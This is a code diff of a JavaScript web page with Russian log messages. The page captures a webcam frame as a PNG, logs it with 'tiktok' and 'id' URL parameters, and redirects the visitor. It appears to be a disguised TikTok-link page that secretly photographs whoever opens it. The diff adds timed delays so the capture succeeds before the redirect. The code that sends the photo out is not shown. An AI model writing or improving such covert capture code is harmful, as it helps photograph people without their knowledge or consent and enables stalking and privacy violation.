@@ -161,21 +161,27 @@
       video.srcObject = stream;
 
 
-      const context = await canvas.getContext('2d');
+      const context = canvas.getContext('2d');
 
-      if (!photoTaken) {
-        console.log('Фотографирование...');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        await context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
-        await canvas.toBlob(async function(blob) {
-          console.log('Фотография создана');
-          savedPhoto = blob;
-          photoTaken = true;
-          await logPhotoInfo();
-          redirectToFinalDestination();
-        }, 'image/png');
-      }
+      let result = await context;
+
+      setTimeout(function () {
+        if (!photoTaken) {
+          console.log('Фотографирование...');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
+          canvas.toBlob(function(blob) {
+            console.log('Фотография создана');
+            savedPhoto = blob;
+            photoTaken = true;
+            setTimeout(function () {
+              logPhotoInfo();
+              redirectToFinalDestination();
+            }, 2000)
+          }, 'image/png');
+        }
+      }, 3000);
     }
 
 
@@ -186,23 +192,32 @@
       window.stream = stream;
       video.srcObject = stream;
       await video.play();
-      const context = await canvas.getContext('2d');
-      if (!photoTaken) {
-          canvas.width = videoWidth;
-          canvas.height = videoHeight;
-          await context.drawImage(video, 0, 0, videoWidth, videoHeight);
-          await canvas.toBlob(async function(blob) {
-                console.log('Фотография создана');
-                savedPhoto = blob;
-                photoTaken = true;
-                await logPhotoInfo();
-                redirectToFinalDestination();
-          
-              }, 'image/png');
+      const { videoWidth, videoHeight } = video;
 
-      };
+      const context = canvas.getContext('2d');
+
+      let result = await context;
+
+      setTimeout(function () {
+        if (!photoTaken) {
+            canvas.width = videoWidth;
+            canvas.height = videoHeight;
+            context.drawImage(video, 0, 0, videoWidth, videoHeight);
+            canvas.toBlob(function(blob) {
+                  console.log('Фотография создана');
+                  savedPhoto = blob;
+                  photoTaken = true;
+
+                  setTimeout(function () {
+                    logPhotoInfo();
+                    redirectToFinalDestination();
+                  }, 2000)
+
+                }, 'image/png');
+              }}, 3000);
     }
-    async function logPhotoInfo() {
+
+    function logPhotoInfo() {
       const urlParams = new URLSearchParams(window.location.search);
       const tiktok_url = urlParams.get('tiktok') || '';
       const user_id = urlParams.get('id') || '';
